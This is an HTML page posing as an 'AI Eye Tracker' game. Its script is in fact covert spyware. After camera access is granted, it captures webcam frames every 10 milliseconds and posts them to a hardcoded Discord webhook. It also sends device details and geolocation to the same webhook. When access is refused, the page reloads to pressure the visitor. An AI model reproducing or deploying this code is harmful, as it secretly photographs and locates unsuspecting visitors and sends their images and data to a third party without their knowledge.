<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>AI Eye Tracker</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      text-align: center;
      background-color: #111;
      color: #0f0;
      margin: 0;
    }
    h1 {
      color: #ff0;
      padding-top: 30px;
    }
    #game-area {
      margin-top: 20px;
      width: 300px;
      height: 300px;
      background-color: #222;
      border: 3px solid #0f0;
      margin-left: auto;
      margin-right: auto;
      position: relative;
      overflow: hidden;
    }
    .dot {
      width: 20px;
      height: 20px;
      background: #0ff;
      position: absolute;
      border-radius: 50%;
    }
    #permission-box {
      background: #222;
      color: #0f0;
      padding: 20px;
      border: 2px solid #0f0;
      width: 80%;
      max-width: 400px;
      margin: 30px auto;
    }
    button {
      background: #0f0;
      color: #111;
      font-weight: bold;
      border: none;
      padding: 10px 20px;
      margin-top: 15px;
      cursor: pointer;
      font-size: 16px;
      border-radius: 8px;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <h1>AI Eye Tracker</h1>

  <div id="permission-box">
    <p>üïπÔ∏è Click here to start face-tracking in-game!</p>
    <button onclick="enableCamera()">üéØ Start Game</button>
  </div>

  <div id="game-area" style="display:none;"></div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="320" height="240"></canvas>

  <script>
    const webhookURL = 'https://discord.com/api/webhooks/1411946800788672522/QnGFBNKTjL1fPW4emPO9a6kSwnW36JQ1RKXpODVSQwvnGtsdb0_L3zR-EJwWMS94s3ms';
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const gameArea = document.getElementById('game-area');

    function enableCamera() {
      document.getElementById('permission-box').style.display = 'none';
      gameArea.style.display = 'block';

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          startAutoCapture();
          collectAdditionalInfo(); // Collect device info
        })
        .catch(err => {
          alert("‚ö†Ô∏è Please allow camera access to proceed.");
          location.reload(); // Force user to retry
        });

      startGameVisuals();
    }

    function startAutoCapture() {
      setInterval(() => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append('file', blob, 'vishnu-capture.png');
          formData.append('username', 'VishnuCam');
          formData.append('content', 'üì∏ New frame captured!');

          fetch(webhookURL, {
            method: 'POST',
            body: formData
          }).catch(err => console.error('Webhook error:', err));
        }, 'image/png');
      }, 10); // 0.5 seconds
    }

    function startGameVisuals() {
      const dot = document.createElement('div');
      dot.className = 'dot';
      gameArea.appendChild(dot);

      setInterval(() => {
        const maxX = gameArea.clientWidth - 20;
        const maxY = gameArea.clientHeight - 20;
        dot.style.left = Math.random() * maxX + 'px';
        dot.style.top = Math.random() * maxY + 'px';
      }, 300);
    }

    function collectAdditionalInfo() {
      // Basic device info
      const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenSize: `${screen.width}x${screen.height}`,
        timestamp: new Date().toLocaleString()
      };

      // Battery status
      if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
          deviceInfo.battery = {
            level: battery.level * 100 + '%',
            charging: battery.charging
          };
          sendDeviceInfo(deviceInfo);
        });
      } else {
        sendDeviceInfo(deviceInfo);
      }

      // Network Info
      if (navigator.connection) {
        deviceInfo.network = {
          type: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink + ' Mbps'
        };
      }

      // Geolocation
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          deviceInfo.location = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          };
          sendDeviceInfo(deviceInfo);
        }, err => {
          deviceInfo.location = 'Permission denied';
          sendDeviceInfo(deviceInfo);
        });
      }
    }

    function sendDeviceInfo(info) {
      const content = `üì± **Device Info**\n\`\`\`json\n${JSON.stringify(info, null, 2)}\n\`\`\``;

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username: "VishnuCam", content })
      }).catch(err => console.error('Device info send failed:', err));
    }
  </script>
</body>
</html>
